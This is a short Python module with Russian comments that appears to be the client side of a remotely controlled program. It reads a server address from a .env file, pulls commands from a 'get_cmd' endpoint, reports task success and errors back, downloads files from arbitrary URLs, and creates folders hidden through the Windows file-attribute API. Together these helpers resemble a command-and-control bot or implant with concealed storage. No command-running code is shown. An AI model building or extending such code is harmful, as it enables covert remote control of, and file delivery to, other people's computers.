from envparse import env
import os
import ctypes
import requests



def split(s: str, c: str) -> list:
    if s.count(c) != 0:
        return s.split(c)
    else:
        return [s]

def download_file(url, folder_path):
    response = requests.get(url, stream=True)
    response.raise_for_status()  # проверка на ошибки

    # Получение имени файла из URL
    filename = url.split('/')[-1]
    file_path = os.path.join(folder_path, filename)

    with open(file_path, 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)

def get_data(id):
    result = requests.get(f'{link}get_cmd?id={id}').json()["data"]
    return result

def send_error(error: str) -> None:
    try:
        url = f'{link}error'
        requests.post(url, json={"error": error})

    except Exception as e:
        print(e)

def send_success(success: str) -> None:
    try:
        url = f'{link}success'
        requests.post(url, json={"task": success})

    except Exception as e:
        print(e)

def create_hidden_folder(path: str):
    if not os.path.exists(path):
        os.makedirs(path)
        # Установить атрибут скрытой папки
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)

# Получить путь к директории, в которой находится скрипт
script_dir = os.path.dirname(os.path.abspath(__file__))
region = 0
# Сформировать полный путь к файлу .env
env_path = os.path.join(script_dir, '.env')

env.read_envfile(env_path)

link = env('LINK')
store = os.path.join(script_dir, 'data')